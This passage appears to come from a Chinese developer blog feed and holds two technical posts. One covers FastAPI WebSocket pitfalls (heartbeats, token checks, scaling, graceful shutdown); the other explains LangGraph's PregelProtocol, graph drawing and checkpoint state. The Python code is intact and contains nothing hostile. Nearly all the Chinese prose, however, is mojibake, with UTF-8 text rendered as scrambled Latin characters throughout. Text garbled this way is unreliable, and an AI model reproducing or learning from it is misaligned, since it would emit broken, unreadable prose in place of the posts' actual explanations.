<p>ççæ¯ä¸æ¯å¾ç®åï¼â¨ ä½è¿éå·²ç»èçä¸ä¸ªåï¼å¦æå®¢æ·ç«¯å¼å¸¸æ­å¼ï¼æ¯å¦ç½ç»éªæ­ï¼ï¼<code style="color: rgba(186, 55, 42, 1)">receive_text()</code> ä¼æåº <code style="color: rgba(186, 55, 42, 1)">WebSocketDisconnect</code>ï¼ä½ å¾æè·å®ï¼å¦åç¨åºä¼å´©æºãææ¾ç»æ²¡åè¿ä¸ª tryï¼ç»æ uvicorn è¿ç¨ç´æ¥ææï¼æè®­æ¨çã</p>

<h2 style="font-size: 22px; margin-top: 40px">ð£ 3. äºä¸ªè®©ä½ åæ¨ä¸ç¹ç¬èµ·æ¥å¡«çåï¼éè§£å³æ¹æ¡ï¼</h2>

<div style="margin: 25px 0">
<p style="font-size: 18px; font-weight: 600">ð 3.1 è¿æ¥èªå¨æ­å¼ï¼å ä¸ºæ²¡æå¿è·³</p>
<p>å¾å¤äºæå¡åï¼æ¯å¦é¿éäºãAWSï¼çè´è½½åè¡¡å¨ï¼å¦æä¸æ®µæ¶é´åæ²¡ææ°æ®ä¼ è¾ï¼ä¼è®¤ä¸ºè¿æ¥ç©ºé²èæå®ææãè¿ä¸ªæ¶é´éå¸¸æ¯ 60 ç§å·¦å³ã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">è§£å³æ¹æ¡ï¼</strong> æå¡ç«¯åå®¢æ·ç«¯é½è¦æå¿è·³æºå¶ãæç®åçåæ³æ¯å®¢æ·ç«¯æ¯é 30 ç§åä¸ä¸ª ping å¸§ï¼æèèªå®ä¹å¿è·³æ¶æ¯ï¼ï¼æå¡ç«¯æ¶å°ååå¤ pongã</p>
<p>å½åæå·ææ²¡åå¿è·³ï¼ç¨æ·ç»å¾æ¶åé¡¿è¶è¿ 1 åéå°±æçº¿ï¼è¢«äº§åç»çè¿½çæãð­ åæ¥å äºä¸ªå®æ¶å¨ï¼ä¸çå®éäºã</p>
<pre class="language-python highlighter-hljs"><code># æå¡ç«¯å¤çå¿è·³çä¼ªä»£ç 
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    while True:
        try:
            # è®¾ç½®æ¥æ¶è¶æ¶ï¼å¦æä¸æ®µæ¶é´æ²¡æ¶å°ä»»ä½æ¶æ¯ï¼ä¸»å¨åå¿è·³æ¢æµ
            data = await asyncio.wait_for(websocket.receive_text(), timeout=30)
            # å¤çæ­£å¸¸æ¶æ¯
        except asyncio.TimeoutError:
            # 30 ç§æ²¡æ¶å°æ¶æ¯ï¼ä¸»å¨åé ping æ¢æµ
            await websocket.send_text("__ping__")  # èªå®ä¹å¿è·³
            # å¦æå®¢æ·ç«¯æ²¡ååºï¼ä¼å¨ä¸ä¸æ¬¡å¾ªç¯è§¦å WebSocketDisconnect</code></pre>
</div>

<div style="margin: 25px 0">
<p style="font-size: 18px; font-weight: 600">ð 3.2 WebSocket æ¡ææ¶å¦ä½æºå¸¦ Tokenï¼</p>
<p>WebSocket çæ¡ææ¯ HTTP è¯·æ±ï¼æä»¥å¯ä»¥å¨ URL åæ°æè Header éå¸¦ tokenãä½åä¸<strong style="color: rgba(186, 55, 42, 1)">ä¸è¦å¨è·¯å¾éææä¼  token</strong>ï¼ä¼è®°å¨æ¥å¿éï¼</p>
<p>æ¨èçåæ³ï¼ç¨ <code style="color: rgba(186, 55, 42, 1)">Sec-WebSocket-Protocol</code> æè Header éç <code style="color: rgba(186, 55, 42, 1)">Authorization</code>ãFastAPI çä¾èµæ³¨å¥ä¹æ¯æ WebSocketï¼ä½ å¯ä»¥åä¸ä¸ªä¾èµæ¥æ ¡éªã</p>
<pre class="language-python highlighter-hljs"><code>from fastapi import WebSocket, WebSocketException, status

async def get_cookie_or_token(websocket: WebSocket):
    # ä» query åæ°æ header å tokenï¼ç¤ºä¾ä» query åï¼
    token = websocket.query_params.get("token")
    if token != "secret":
        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
        raise WebSocketException("è®¤è¯å¤±è´¥")
    return token

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = Depends(get_cookie_or_token)):
    await websocket.accept()
    # ...</code></pre>
</div>

<div style="margin: 25px 0">
<p style="font-size: 18px; font-weight: 600">ð 3.3 è¿æ¥æ°ä¸é«ï¼æå¡å°±å¡æ­»ï¼</p>
<p>æ¯ä¸ª WebSocket è¿æ¥é½ä¼å ç¨ä¸ä¸ªç³»ç»æä»¶æè¿°ç¬¦ååå­ãé»è®¤ç uvicorn åè¿ç¨è½æ¯æçè¿æ¥æ°æéï¼åå³äºä½ æºå¨éç½®ï¼ãå¦æç´æ¥è£¸è·ï¼åå­å¯è½ä¼è¢«æ¢æ¢ååã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">è§£å³æ¹æ¡ï¼</strong></p>
<div style="margin-left: 15px">
<p>ð¹ ç¨ <code style="color: rgba(186, 55, 42, 1)">gunicorn + uvicorn workers</code> å¯å¨å¤è¿ç¨ï¼æ³¨æè®¾ç½®éå½ç worker æ°éï¼ä¸è¬ = CPU æ ¸å¿æ° * 2ã</p>
<p>ð¹ å¦æå¹¿æ­æ¶æ¯é¢ç¹ï¼ä¸è¦ç¨ç®åçå¨å±å¾ªç¯ç»ææè¿æ¥åï¼å¯ä»¥ç¨ <code style="color: rgba(186, 55, 42, 1)">asyncio.gather</code> å¹¶ååéï¼ä½æ³¨ææ§å¶å¹¶åæ°ï¼é²æ­¢çªåæµéæ CPU ææ»¡ã</p>
<p>ð¹ èèä½¿ç¨ Redis ç­ä¸­é´ä»¶åæ¶æ¯ååï¼ç¹å«æ¯å¤è¿ç¨æ¨¡å¼ä¸ï¼ä¸ä¸ªè¿ç¨ä¸ç¥éå¦ä¸ä¸ªè¿ç¨ç®¡ççè¿æ¥ï¼éè¦åå©å¤é¨å¹¿æ­ã</p>
</div>
<p style="background-color: rgba(255, 243, 205, 1); padding: 10px; border-radius: 5px; margin-top: 15px">â ï¸ çº¿ä¸æè®­ï¼ææ¾ç¨åè¿ç¨è·äº 5000 ä¸ªè¿æ¥ï¼ç»æåå­å ç¨ 2GBï¼é¢ç¹ GCï¼æåç¨ <code style="color: rgba(186, 55, 42, 1)">--workers 4</code> è§£å³äºï¼ä½å¹¿æ­åæäºæ°é®é¢ï¼åæ¥å¼å¥äº Redis pub/subã</p>
</div>

<div style="margin: 25px 0">
<p style="font-size: 18px; font-weight: 600">ð 3.4 æå¡éå¯æ¶ï¼ç¨æ·ç¬é´æçº¿æä¹åï¼</p>
<p>å½ä½ é¨ç½²æ°çæ¬ï¼éè¦éå¯æå¡ï¼ææ WebSocket è¿æ¥ä¼è¢«ç²æ´å³é­ãç¨æ·ä¼çå°âè¿æ¥å·²æ­å¼âãè¿å¾ä¸ä¼éã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">è§£å³æ¹æ¡ï¼</strong> å©ç¨ uvicorn ç <code style="color: rgba(186, 55, 42, 1)">lifespan</code> äºä»¶ï¼å¨å³é­åä¸»å¨éç¥å®¢æ·ç«¯ï¼æ¯å¦åä¸æ¡âæå¡å³å°ç»´æ¤âçæ¶æ¯ï¼ï¼å¹¶ç­å¾å ç§åå³é­ãä¹å¯ä»¥éåè´è½½åè¡¡ç draining æºå¶ã</p>
<pre class="language-python highlighter-hljs"><code># å¨ shutdown äºä»¶éåæ¸ç
@app.on_event("shutdown")
async def shutdown_cleanup():
    # éåæææ´»è·è¿æ¥ï¼åä¸çº¿éç¥
    for connection in active_connections:
        try:
            await connection.send_text("server going down, reconnect later")
        except:
            pass
    # ç­ 1 ç§è®©æ¶æ¯ååºå»
    await asyncio.sleep(1)</code></pre>
</div>

<div style="margin: 25px 0">
<p style="font-size: 18px; font-weight: 600">ð 3.5 ææ¬è¿æ¯äºè¿å¶ï¼JSON è¿æ¯èªå®ä¹ï¼</p>
<p>WebSocket æ¯æææ¬åäºè¿å¶å¸§ãå¦æä½ ä»¬ååç«¯çº¦å®ç¨ JSONï¼è®°å¾å¤çè§£æå¼å¸¸ãææ¾ç»å ä¸ºåç«¯åäºä¸ªéæ³ç JSONï¼æå¡ç«¯æ²¡æè· <code style="color: rgba(186, 55, 42, 1)">json.JSONDecodeError</code>ï¼ç´æ¥å¯¼è´è¿æ¥å´©æºã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">ç¨³å¥çåæ³ï¼</strong> ç»ä¸ç¨ <code style="color: rgba(186, 55, 42, 1)">receive_json()</code> å¹¶æè·å¼å¸¸ï¼ç»å®¢æ·ç«¯è¿åéè¯¯ç ï¼èä¸æ¯æ­å¼è¿æ¥ã</p>
</div>

<h2 style="font-size: 22px; margin-top: 40px">ð§  4. ç¨åºåªçç¢ç¢å¿µï¼ä»è½ç¨âå¥½ç¨âç¨³å¦æ³°å±±</h2>
<p>WebSocket çä¸æé¨æ§ç¡®å®ä½ï¼ä½æ³å¨çäº§ç¯å¢è·å¾ç¨³ï¼ä½ éè¦èèè¿äºï¼</p>
<div style="margin-left: 15px">
<p>â çæ§ï¼æ¯ä¸æ¡è¿æ¥çå­æ´»æ¶é´ãæ¶åæ¶æ¯æ°éï¼æå¥½é½è½éè¿ metrics æ´é²åºæ¥ï¼æ¯å¦ç¨ Prometheusï¼ã</p>
<p>â éæµï¼åä¸ªç¨æ·åæ¶æ¯å¤ªå¿«æä¹åï¼å¯ä»¥ç¨æ¼æ¡¶æä»¤çæ¡¶éå¶é¢çï¼é²æ­¢è¢«æ¶ææ»å»ã</p>
<p>â æ­çº¿éè¿ï¼å®¢æ·ç«¯ä¸å®è¦æèªå¨éè¿æºå¶ï¼ææ°éé¿ç­ç¥ï¼é¿ååæ¶éè¿é ææå¡å¨ååã</p>
<p>â æµè¯ï¼ç¨ <code style="color: rgba(186, 55, 42, 1)">websockets</code> åºåèæ¬æ¨¡ææ°åä¸ªè¿æ¥ï¼åæµä¸ä¸ä½ çæå¡ï¼çèµæºå ç¨åååºå»¶è¿ã</p>
</div>
<p>æè¿è®°å¾æä¸æ¬¡ï¼æå¿è®°è®¾ç½® <code style="color: rgba(186, 55, 42, 1)">max_size</code> éå¶ï¼å®¢æ·ç«¯ä¼ äºä¸ªè¶å¤§çæ¶æ¯ï¼ç´æ¥æåå­æçäºãåæ¥å¨ accept ä¹åå ä¸ <code style="color: rgba(186, 55, 42, 1)">websocket.max_size = 1_048_576</code> ï¼1MBï¼ï¼ä¸çåæ¸åäºã</p>
<hr style="border: none; height: 1px; background: linear-gradient(90deg, rgba(0, 0, 0, 0), rgba(52, 152, 219, 1), rgba(0, 0, 0, 0)); margin: 40px 0">
<p style="font-size: 20px; font-weight: 500; text-align: center; margin: 30px 0">èæåï¼ä»å¤©çåäº«å°±å°è¿éãå¦æä½ ä¹å¨ FastAPI éè¸©è¿ WebSocket çåï¼æèæä»ä¹ç¬å®¶ç§ç¬ï¼æ¬¢è¿çè¨åºåç£ã</p>
<p style="background-color: rgba(238, 242, 247, 1); padding: 20px; border-radius: 12px; text-align: center">â­ï¸ è§å¾æç¨çè¯ï¼<strong style="color: rgba(186, 55, 42, 1)">ç¹ä¸ªèµ</strong> åèµ°åï¼è¿æ ·æä¸åææå¨åååºæ´å¤FastAPI é¿åæåã<br>å½ç¶ï¼<strong style="color: rgba(186, 55, 42, 1)">å³æ³¨</strong>æä¹å¯ä»¥ï¼æ¯ç«ä½ ä¸ç¥éæä¸æ¬¡åä¼å ä¸ºä»ä¹éªæä½ï¼ç»ä½ å¸¦æ¥æ°çå®æç»éªï½ ð</p>
</div>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-15 13:13">2026-02-15 13:13</span>&nbsp;
<a href="https://www.cnblogs.com/ymtianyu">ä¸åç¨åºåªå</a>&nbsp;
éè¯»(<span id="post_view_count">43</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19617874);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19617874', targetLink: 'https://www.cnblogs.com/ymtianyu/p/19617874', title: 'FastAPI å®æï¼WebSocket ä»å¥é¨å°ä¸çº¿ï¼ä½¿ç¨é¿åæå' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ [æè§£LangChainæ§è¡å¼æ] PregelProtocolââå®ä¹äº"LangChainæ§è¡ä½"æå°åè½é ]]></title>
    <link>https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol</link>
    <guid>a8052b8433198260dc8cdd58b8eaef9b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol" title="åå¸äº 2026-02-16 07:22">
    <span role="heading" aria-level="2">[æè§£LangChainæ§è¡å¼æ] PregelProtocolââå®ä¹äº"LangChainæ§è¡ä½"æå°åè½é</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        Pregelæ¯å¯¹PregelProtocolåè®®çå®ç°ï¼åèçå¼å¥æ å¿ç LangGraph ä»ä¸ä¸ªåä¸çåºè¿åä¸ºäºä¸ä¸ªå¯ææçå¾è®¡ç®æ¡æ¶ãå¾å¯ä»¥è§ä¸ºâLangGraph æ§è¡ä½âï¼èPregelProtocolå®ä¹äºå®å¿é¡»å·å¤çæå°åè½éå
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>Pregelæ¯å¯¹<code>PregelProtocol</code>åè®®çå®ç°ï¼åèçå¼å¥æ å¿ç LangGraph ä»ä¸ä¸ªåä¸çåºè¿åä¸ºäºä¸ä¸ªå¯ææçå¾è®¡ç®æ¡æ¶ãå¾å¯ä»¥è§ä¸ºâLangGraph æ§è¡ä½âï¼èPregelProtocolå®ä¹äºå®å¿é¡»å·å¤çæå°åè½éåãæä»¬ä»è¿åè®®çæåå®ä¹æ¥ççè¿ä¸ªåè½éååå«åªäºæä½ã</p>
<h2 id="1-éç½®ç»å®">1. éç½®ç»å®</h2>
<p>éè¿åé¢çåå®¹æä»¬ä¼åç°<code>RunnableConfig</code>è¿ä¸ªå¯¹è±¡å ä¹æ¶æ æä¸å¨ï¼æä»¬å¨è°ç¨Pregelå¯¹è±¡çæ¶åå¯ä»¥å°å®ä½ä¸ºåæ°ï¼ç¨æ¥æä¾ç¨äºæ§å¶å¶æ§è¡è¡ä¸ºï¼æ¯å¦è¿­ä»£éå¶ï¼å¹¶åæ§å¶ç­ï¼çéç½®ãæ§è¡å¼æè¿å°å®ä½ä¸ºå®¹å¨ç¨æ¥ä¸æµæµç¨ä¼ éä¸äºç»ä»¶åä¿¡å·ï¼æä»¥åé¢çæ¼ç¤ºå®ä¾æå¯ä»¥å¨Nodeå¤çå½æ°ä¸­ä»æ³¨å¥çRunnableConfigä¸­æåå<code>Runtime</code>ã<code>PregelScratchpad</code>ã<code>Checkpointå½åç©ºé´</code>å<code>éæä¸ä¸æ</code>è¿æ ·å¯¹è±¡åä¿¡æ¯ãå¯¹äºåçº¯PregelçNodeï¼ä¸åæ¬StateGraphçNodeï¼ï¼RunnableConfigä½¿å¯ä¸å¯ä»¥æ³¨å¥å°å¤çå½æ°ä¸­çåæ°ï¼æä»¥é¤äºè¾å¥åæ°ï¼å¶ä»æéçä¿¡æ¯åªè½ä»å®éé¢æåã</p>
<p><code>with_config</code>æ¹æ³èµäºäºè¿ä¸ª âæ§è¡ä½âä¸éç½®ç»å®çè½åãé¤äºæä¾RunnableConfigå¯¹è±¡ï¼æä»¬è¿å¯ä»¥å©ç¨å³é®è¯åæ°æä¾å¾ç»å®çéç½®ãç±äºRunnableConfigæ¬è´¨ä¸å°±æ¯ä¸ä¸ªTypedDictå¯¹è±¡ï¼æä¾çå³é®å­åæ°ç»æçé®å¼å¯¹å¯ä»¥ç´æ¥è½¬æ¢æRunnableConfigå¯¹è±¡ãwith_configæ¹æ³ä¼å°ä¸¤èåå¹¶ï¼çæä¸ä¸ªæ°çRunnableConfigå¯¹è±¡ç»å®å°æ§è¡ä½ä¸ã</p>
<pre><code class="language-python">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):
    @abstractmethod
    def with_config(
        self, config: RunnableConfig | None = None, **kwargs: Any
    ) -&gt; Self: ...
</code></pre>
<h2 id="2-å¯è§ååç°">2. å¯è§ååç°</h2>
<p>PregelProtocolæ¯LangGraphå¯¹ âå¾â çæ½è±¡ï¼è¿éçå¾æ¯ âå¾è®ºâ çæ¦å¿µï¼ä½æ¯è¥çè½å°å®çç»æåç°å¨ä¸å¼  âå¾çâ ä¸­ï¼è¿æ çæ¯éå¸¸ææä¹çãæ¯ç«ä»£ç ä»ä»æ¯é¢åç¨åºåçè¯­è¨ï¼æ¯ä¸ä¸å¾çï¼ä¸ä½ç´è§ï¼è¿æ²¡æåä¼éå¶ãLangGraphä¸é¨å®ä¹äºå¦ä¸è¿ä¸ªGraphç±»åæ¥è¡¨ç¤ºé¢å âå¯è§ååç°â çå¾ã</p>
<p>ä¸ä¸ªGraphå¯¹è±¡æ è¯çå¾ä¾ç¶ç±NodeåEdgeææãå®çæ¯ä¸ªNodeé½æä¸ä¸ªå¯ä¸æ è¯ï¼æä»¬å¯ä»¥è°ç¨<code>next_id</code>æ¹æ³ä¸ºä¸ä¸ä¸ªå¾æ·»å çNodeçææ­¤æ è¯ãæä»¬ä¸ä»å¯ä»¥è°ç¨<code>add_node</code>ã<code>remove_node</code>å<code>add_edge</code>è¿æ ·çæ¹æ³ä»¥æ·»å /ç§»é¤NodeåEdgeæ¥æå»ºå¾ï¼è¿å¯ä»¥è°ç¨<code>extend</code>æ¹æ³å°å¦ä¸ä¸ªGraphçææNodeåEdgeæ·»å è¿æ¥ã</p>
<pre><code class="language-python">@dataclass
class Graph:
    nodes: dict[str, Node] = field(default_factory=dict)
    edges: list[Edge] = field(default_factory=list)
    
    def next_id(self) -&gt; str
    def add_node(
        self,
        data: type[BaseModel] | RunnableType | None,
        id: str | None = None,
        *,
        metadata: dict[str, Any] | None = None,
    ) -&gt; Node
    def remove_node(self, node: Node) -&gt; None
    def add_edge(
        self,
        source: Node,
        target: Node,
        data: Stringifiable | None = None,
        conditional: bool = False,  # noqa: FBT001,FBT002
    ) -&gt; Edge
    def extend(
        self, graph: Graph, *, prefix: str = ""
    ) -&gt; tuple[Node | None, Node | None]:

    def reid(self) -&gt; Graph:
    def first_node(self) -&gt; Node | None
    def last_node(self) -&gt; Node | None
    def trim_first_node(self) -&gt; None
    def trim_last_node(self) -&gt; None

    def to_json(self, *, with_schemas: bool = False) -&gt; dict[str, list[dict[str, Any]]]
    def draw_ascii(self) -&gt; str:
    def print_ascii(self) -&gt; None:
    @overload
    def draw_png(
        self,
        output_file_path: str,
        fontname: str | None = None,
        labels: LabelsDict | None = None,
    ) -&gt; None: ...
    @overload
    def draw_png(
        self,
        output_file_path: None,
        fontname: str | None = None,
        labels: LabelsDict | None = None,
    ) -&gt; bytes: ...
    def draw_png(
        self,
        output_file_path: str | None = None,
        fontname: str | None = None,
        labels: LabelsDict | None = None,
    ) -&gt; bytes | None
    def draw_mermaid(
        self,
        *,
        with_styles: bool = True,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | None = None,
        wrap_label_n_words: int = 9,
        frontmatter_config: dict[str, Any] | None = None,
    ) -&gt; str
    def draw_mermaid_png(
        self,
        *,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | None = None,
        wrap_label_n_words: int = 9,
        output_file_path: str | None = None,
        draw_method: MermaidDrawMethod = MermaidDrawMethod.API,
        background_color: str = "white",
        padding: int = 10,
        max_retries: int = 1,
        retry_delay: float = 1.0,
        frontmatter_config: dict[str, Any] | None = None,
        base_url: str | None = None,
        proxies: dict[str, str] | None = None,
    ) -&gt; bytes
</code></pre>
<p>è°ç¨<code>reid</code>æ¹æ³å¯ä»¥è¿åä¸ä¸ªæ°çGraphå¯¹è±¡ï¼å®å°½éä¿çéä¸­å¯è¯»æ§çåç´ ï¼ä½æ¯NodeçIDä¼éæ°çæãGraphç<code>first_node</code>å<code>last_node</code>æ¹æ³è¿åç¬¬ä¸ä¸ªåæåä¸ä¸ªNodeãå¦ææä»¬å¸æå é¤ç¬¬ä¸ä¸ªåªæåä¸è¾åºEdgeæèæåä¸ä¸ªåªæåä¸è¾å¥EdgeçNodeï¼å¯ä»¥è°ç¨<code>trim_first_node</code>æè<code>trim_last_node</code>æ¹æ³ã</p>
<p>æå»ºå¥½çGraphå¯ä»¥éç¨ä¸åçåç°æ¹å¼ãGraphæä¾äºäºä¸ªâç»å¾âæ¹æ³ï¼å¶ä¸­<code>draw_ascii</code>å<code>print_ascii</code>éç¨asciiç å­ç¬¦çåç°æ¹å¼ï¼åèè¿åå·ä½çasciiç å­ç¬¦ä¸²ï¼åèåç´æ¥å¨ç»ç«¯å°å¾ç»å¶åºæ¥ï¼è¿ç§æ¹æ³ä¸ä¾èµå¶ä»çç»å¾ç¸å³çåã<code>draw_mermaid</code>å<code>draw_mermaid_png</code>éç¨Mermaidå¾è¡¨çåç°æ¹å¼ï¼Mermaid æ¯ä¸ç§åºäºææ¬çæµç¨å¾å®ä¹è¯­è¨ï¼å¹¿æ³æ¯æäº GitHubãNotion ååç§ç¼è¾å¨ä¸­ãdraw_mermaidè¿åå¾æ ææ¬ï¼è<code>draw_mermaid_png</code>åç´æ¥å°å¾è¡¨è¿ä¸æ­¥æ¸²ææPNGå¾çãGraphå¯¹è±¡ä¹å¯ä»¥éè¿è°ç¨<code>draw_png</code>æ¹æ³æ¸²ææPNGå¾çï¼è¯¥æ¹æ³æç»ä¼Graphvizï¼ä¸ä¸ªå¼æºçå¾å¯è§åè½¯ä»¶ï¼æ¥å¸å±åæ¸²æå¾çã</p>
<p>ååå°PregelProtocolç±»åçå®ä¹ä¸ï¼å®å®ä¹äºå¦ä¸æç¤ºç<code>get_graph/aget_graph</code>æ¹æ³ï¼å®ä»¬çè¿åç±»åDrawableGraphæ­£æ¯ä¸è¿°Graphç±»åçå«åãè¯¥æ¹æ³é¤äºå¯ä»¥ä¼ å¥RunnableConfigå¯¹è±¡ä½ä¸ºå¯ééç½®å¤ï¼è¿å·æä¸ä¸ªåä¸º<code>xray</code>çåæ°ãxrayï¼Xåï¼åæ°å³å®äºä½ å¨æ¥çå¾ç»ææ¶ï¼å°åºè½çå¤æ·±ãå®ä¸é¨ç¨äºå¤çå­å¾çå±å¼æ¾ç¤ºãå¦æè®¾ç½®ä¸ºFalseï¼é»è®¤å¼ï¼ï¼å¾å°ä»¥ âé»çâ æ¨¡å¼æ¾å¼ï¼å¦æä½ çå¾ä¸­åå«å­å¾ï¼å®åªä¼æ¾ç¤ºä¸ºä¸ä¸ªåä¸çèç¹ãä½ çä¸è§å­å¾åé¨çä»»ä½èç¹ãè¾¹æé»è¾ãåä¹å°ä¼éç¨ âå¨å±å¼â æ¨¡å¼ï¼å®ä¼å X åä¸æ ·ç©¿éææå±çº§ï¼å°ææåµå¥å­å¾åé¨çèç¹åè¿çº¿å¨é¨å¹³éºåºæ¥ã</p>
<pre><code class="language-python">from langchain_core.runnables.graph import Graph as DrawableGraph
class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):
    @abstractmethod
    def get_graph(
        self,
        config: RunnableConfig | None = None,
        *,
        xray: int | bool = False,
    ) -&gt; DrawableGraph: ...

    @abstractmethod
    async def aget_graph(
        self,
        config: RunnableConfig | None = None,
        *,
        xray: int | bool = False,
    ) -&gt; DrawableGraph: ...
</code></pre>
<p>å¨ç¬¬ä¸ä¸ªæ¼ç¤ºå®ä¾ä¸­ï¼æä»¬åå»ºäºä¸ä¸ªä½ä¸ºâç¬è¯çæå¨âçAgentï¼ç°å¨æä»¬å°å®ç®åï¼ççç±å®çæçGraphå¦ä½å°å¾çç»æä»¥å¯è§åçå½¢å¼åç°åºæ¥ãå¦ä¸é¢çä»£ç çæ®µæç¤ºï¼æä»¬å©ç¨StateGraphä½ä¸ºBuilderï¼æå»ºäºä¸å¼ ç±ä¸¤ä¸ªNodeç»æçå¾ï¼å®ä»¬åStartåEndä¹é´æåæ¡è¾¹ã</p>
<pre><code class="language-python">from langgraph.graph import StateGraph, START, END
from langgraph.pregel.protocol import PregelProtocol
from PIL import Image as PILImage
import io
from langgraph.checkpoint.memory import MemorySaver

def generate_joke(state):
    pass

def regenerate_joke(state):
    pass

builder = (
    StateGraph(dict)
    .add_node("generate_joke", generate_joke)
    .add_node("regenerate_joke", regenerate_joke)
)

builder.add_edge(START, "generate_joke")
builder.add_edge("regenerate_joke", END)
builder.add_conditional_edges(
    "generate_joke", lambda _: "bad", {"good": END, "bad": "regenerate_joke"}
)

app: PregelProtocol = builder.compile(MemorySaver())
graph = app.get_graph()
graph.print_ascii()

bytes = graph.draw_mermaid_png()
PILImage.open(io.BytesIO(bytes)).show()
</code></pre>
<p>å¨å°StateGraphç¼è¯æPregelå¯¹è±¡åï¼æä»¬è°ç¨å¶get_graphæ¹æ³å¾å°å¯¹åºçGraphå¯¹è±¡ãæä»¬ä»¥ä¸¤ç§å½¢å¼åç°å¶ç»æï¼åèéè¿è°ç¨print_asciiæ¹æ³ä»¥ASCIIå­ç¬¦çå½¢å¼è¾åºå¾ç»æï¼åèè°ç¨draw_mermaid_pngæ¹æ³çæä¸å¼ PNGå¾çãä¸å¾å·¦å³ä¸¤é¨ååå«å±ç°äºä¸¤ç§åç°æ¹å¼çææã</p>
<h2 id="3-æä¹å">3. æä¹å</h2>
<p>ä¸ºäºæ¯æâä¸­æ­/æ¢å¤âçæ§è¡æ¹å¼ï¼åæ¶ä¸ºâæ¶é´æè¡âæä¾æ¯æï¼å¾å¿é¡»å©ç¨æä¹åçæ¹å¼å°æ§è¡è¿ç¨çéè¦æ¶å»çç¶æä¿å­ä¸æ¥ãLangGraphéç¨åºäº<code>Checkpoint</code>çæä¹åå½¢å¼ï¼å¯¹äºæå®çæ¯ä¸ªä»»å¡ï¼ä¸è®ºæ¯æ§è¡æåéå¯¹Channelçåå¥æå¾ï¼è¿æ¯æåºå¼å¸¸ãäººä¸ºä¸­æ­æèResume Valueçæä¾ï¼é½ä¼ä»¥Pending Writeçå½¢å¼è¢«è®°å½ä¸æ¥ï¼å½è¶æ­¥æåå®æï¼éå¯¹Channelçåå¥è¢«æååºç¨ï¼è¿äºPending Writeè¢«ä¸¢å¼ï¼æ¢æ¥ä¸ä¸ªCheckpointæ¥æè¿°å½åçç¶æã</p>
<p>ä½ä¸ºâLangGraph æ§è¡ä½âçæ½è±¡ï¼PregelProtocolå®ä¹äº<code>get_state/aget_state</code>æ¹æ³ç¨äºè¯»åå¨æä¸ªSuperstepç±Checkpointï¼å¯¹äºæåä¸ä¸ªæªå®æçSuperstepï¼è¿åæ¬Pending Writeï¼æå»ºçç¶æå¿«ç§ï¼è¯¥å¿«ç§ä½ç°ä¸ºä¸ä¸ªStateSnapshotå¯¹è±¡ã<code>get_state_history/aget_state_history</code>è¿åç±è¿äºå¿«ç§è°±åçä¸æ®µåå²ã</p>
<pre><code class="language-python">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):
    @abstractmethod
    def get_state(
        self, config: RunnableConfig, *, subgraphs: bool = False
    ) -&gt; StateSnapshot: ...

    @abstractmethod
    async def aget_state(
        self, config: RunnableConfig, *, subgraphs: bool = False
    ) -&gt; StateSnapshot: ...

    @abstractmethod
    def get_state_history(
        self,
        config: RunnableConfig,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; Iterator[StateSnapshot]: ...

    @abstractmethod
    def aget_state_history(
        self,
        config: RunnableConfig,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; AsyncIterator[StateSnapshot]: ...

    @abstractmethod
    def bulk_update_state(
        self,
        config: RunnableConfig,
        updates: Sequence[Sequence[StateUpdate]],
    ) -&gt; RunnableConfig: ...

    @abstractmethod
    async def abulk_update_state(
        self,
        config: RunnableConfig,
        updates: Sequence[Sequence[StateUpdate]],
    ) -&gt; RunnableConfig: ...

    @abstractmethod
    def update_state(
        self,
        config: RunnableConfig,
        values: dict[str, Any] | Any | None,
        as_node: str | None = None,
    ) -&gt; RunnableConfig: ...

    @abstractmethod
    async def aupdate_state(
        self,
        config: RunnableConfig,
        values: dict[str, Any] | Any | None,
        as_node: str | None = None,
    ) -&gt; RunnableConfig: ...
</code></pre>
<p>æä¹åå­å¨çCheckpointä¸ä»ä½¿æä»¬å¯ä»¥åé¡¾åå²ï¼è¿å¯ä»¥æä¾âæ¶é´æè¡âï¼ä½¿æä»¬å¯ä»¥ä»æä¸ªåå²æ¶å»éæ°æ§è¡åé¢çæµç¨ãä¸ä»å¦æ­¤ï¼PregelProtocolè¿æä¾äº<code>update_state /bulk_update_state/abulk_update_state</code>å¯ä»¥ç´æ¥ä¿®æ¹ç¶æãä½æ¯å®ä»¬å¹¶éâç¯¡æ¹åå²âï¼åªæ¯åºäºæä¸ªå¨æä¸ªåå²æ¶å»å¼å¯äºå¦ä¸æ®µâå¹³è¡å®å®âèå·²ãæä¹åä½¿LangGraph.Pregelä½ä¸ºæ ¸å¿åé¨åï¼æä»¬å°å¨åç»­é¨åå¯¹å®è¿è¡ä¸é¨çä»ç»ã</p>
